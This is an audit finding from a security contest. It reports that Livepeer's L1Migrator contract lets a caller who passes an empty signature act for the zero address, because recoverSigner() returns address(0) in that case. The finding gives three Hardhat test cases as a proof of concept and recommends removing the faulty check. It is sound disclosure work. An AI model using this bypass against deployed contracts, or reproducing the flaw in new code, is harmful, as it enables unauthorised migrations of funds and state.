## Tags

- bug
- 1 (Low Risk)
- resolved
- sponsor confirmed

# [Signature authentication bypass for ZERO address](https://github.com/code-423n4/2022-01-livepeer-findings/issues/142) 

# Handle

kemmio


# Vulnerability details

## Impact
Vulnerability in requireValidMigration() function gives opportunity to authenticate on behalf of ZERO address (l1addr == ZERO) and migrate locked up bonds, delegators, sender

## Proof of Concept

L1Migrator contract's functions migrateDelegator(), migrateUnbondingLocks(), migrateSender() use requireValidMigration() to authenticate the migration request, as can be seen in:
https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L164-L173
https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L214-L228
https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L267-L274

requireValidMigration() checks if l2addr=ZERO and reverts in that's the case:
https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L506-L509

Next it checks wether msg.sender==l1addr or tries to authenticate with signature otherwise:
https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L510-L514

It calls recoverSigner() for that purpose which calls ECDS.recover to recover signing address, but before that it checks if signature is empty and returns address(0):
https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L522-L524

This functionality can be abused to bypass authentication for ZERO address

Proof of Concept:
(add this tests to ./test/unit/L1/l1Migrator.test.ts and run "yarn test test/unit/L1/l1Migrator.test.ts" )
```
      it('migrates delegator for l1addr==ZERO auth', async () => {

        const sig = '0x';
        let tx = l1Migrator
            .connect(notL1EOA)
            .migrateDelegator('0x0000000000000000000000000000000000000000', l1EOA.address, '0x', 0, 0, 0, {
              value: ethers.utils.parseEther('1'),
            });
        await expect(tx).to.emit(l1Migrator,'MigrateDelegatorInitiated');
      });
      it('migrates unbonding locks for l1addr==ZERO auth', async () => {

        const sig = '0x';
        let tx = l1Migrator
            .connect(notL1EOA)
            .migrateUnbondingLocks(
                '0x0000000000000000000000000000000000000000',
                l1EOA.address,
                [],
                '0x',
                0,
                0,
                0,
                {
                  value: ethers.utils.parseEther('1'),
                },
            );
        await expect(tx).to.emit(l1Migrator,'MigrateUnbondingLocksInitiated');
      });
      it('migrates sender for l1addr==ZERO auth', async () => {

        const sig = '0x';
        let tx = l1Migrator
            .connect(notL1EOA)
            .migrateSender('0x0000000000000000000000000000000000000000', l1EOA.address, '0x', 0, 0, 0, {
              value: ethers.utils.parseEther('1'),
            });
        await expect(tx).to.emit(l1Migrator,'MigrateSenderInitiated');
      });
```

## Tools Used

## Recommended Mitigation Steps
Remove these lines:
https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L522-L524

